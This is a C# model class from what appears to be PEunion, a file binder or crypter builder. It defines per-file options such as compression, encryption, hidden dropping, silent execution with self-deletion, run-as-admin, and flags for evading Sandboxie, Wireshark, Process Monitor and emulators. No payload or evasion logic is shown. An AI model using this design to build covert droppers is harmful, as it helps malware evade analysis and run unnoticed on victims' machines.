using BytecodeApi;
using System.IO;
using System.Linq;
using System.Windows.Media;

namespace PEunion
{
	public class ProjectFile : ProjectItem
	{
		private string _FullName;
		private string _Name;
		private ImageSource _Icon;
		private bool _Compress;
		private bool _Encrypt;
		private bool _Hidden;
		private int _DropLocation;
		private bool _Execute;
		private bool _ExecuteWait;
		private bool _ExecuteDelete;
		private bool _Runas;
		private string _CommandLine;
		private bool _AntiSandboxie;
		private bool _AntiWireshark;
		private bool _AntiProcessMonitor;
		private bool _AntiEmulator;

		public string FullName
		{
			get => _FullName;
			set
			{
				Set(() => FullName, ref _FullName, value);
				Project.IsDirty = true;
				RaisePropertyChanged(() => SourceDirectory);
				RaisePropertyChanged(() => SourceFileName);
				RaisePropertyChanged(() => SourceFileSize);
			}
		}
		public string Name
		{
			get => _Name;
			set
			{
				Set(() => Name, ref _Name, value);
				Project.IsDirty = true;
			}
		}
		public ImageSource Icon
		{
			get => _Icon;
			set => Set(() => Icon, ref _Icon, value);
		}
		public bool Compress
		{
			get => _Compress;
			set
			{
				Set(() => Compress, ref _Compress, value);
				Project.IsDirty = true;
			}
		}
		public bool Encrypt
		{
			get => _Encrypt;
			set
			{
				Set(() => Encrypt, ref _Encrypt, value);
				Project.IsDirty = true;
			}
		}
		public bool Hidden
		{
			get => _Hidden;
			set
			{
				Set(() => Hidden, ref _Hidden, value);
				Project.IsDirty = true;
			}
		}
		public int DropLocation
		{
			get => _DropLocation;
			set
			{
				Set(() => DropLocation, ref _DropLocation, value);
				Project.IsDirty = true;
			}
		}
		public bool Execute
		{
			get => _Execute;
			set
			{
				Set(() => Execute, ref _Execute, value);
				RaisePropertyChanged(() => CanExecuteWait);
				ExecuteWait &= value;
				Runas &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteWait
		{
			get => _ExecuteWait;
			set
			{
				Set(() => ExecuteWait, ref _ExecuteWait, value);
				RaisePropertyChanged(() => CanExecuteDelete);
				ExecuteDelete &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteDelete
		{
			get => _ExecuteDelete;
			set
			{
				Set(() => ExecuteDelete, ref _ExecuteDelete, value);
				Project.IsDirty = true;
			}
		}
		public bool Runas
		{
			get => _Runas;
			set
			{
				Set(() => Runas, ref _Runas, value);
				Project.IsDirty = true;
			}
		}
		public string CommandLine
		{
			get => _CommandLine;
			set
			{
				Set(() => CommandLine, ref _CommandLine, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiSandboxie
		{
			get => _AntiSandboxie;
			set
			{
				Set(() => AntiSandboxie, ref _AntiSandboxie, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiWireshark
		{
			get => _AntiWireshark;
			set
			{
				Set(() => AntiWireshark, ref _AntiWireshark, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiProcessMonitor
		{
			get => _AntiProcessMonitor;
			set
			{
				Set(() => AntiProcessMonitor, ref _AntiProcessMonitor, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiEmulator
		{
			get => _AntiEmulator;
			set
			{
				Set(() => AntiEmulator, ref _AntiEmulator, value);
				Project.IsDirty = true;
			}
		}

		public string SourceDirectory => Path.GetDirectoryName(FullName);
		public string SourceFileName => Path.GetFileName(FullName);
		public string SourceFileSize => File.Exists(FullName) ? Wording.GetFriendlySizeName(new FileInfo(FullName).Length) : "<file not found>";
		public int DropAction
		{
			get => ExecuteDelete ? 3 : ExecuteWait ? 2 : Execute ? 1 : 0;
			set
			{
				Execute = value >= 1;
				ExecuteWait = value >= 2;
				ExecuteDelete = value >= 3;
			}
		}
		public bool CanExecuteWait => Execute;
		public bool CanExecuteDelete => ExecuteWait;

		public ProjectFile(Project project, string path) : base(project)
		{
			FullName = path;
			Name = Path.GetFileName(FullName);
			Icon = File.Exists(FullName) ? new FileInfo(FullName).GetFileIcon(false).ToBitmapSource() : Utility.GetImageResource("IconMissingFile");
			Compress = true;
			Encrypt = true;
			Hidden = true;
			DropLocation = Lookups.DropLocations.Keys.First();
			Execute = true;
		}
	}
}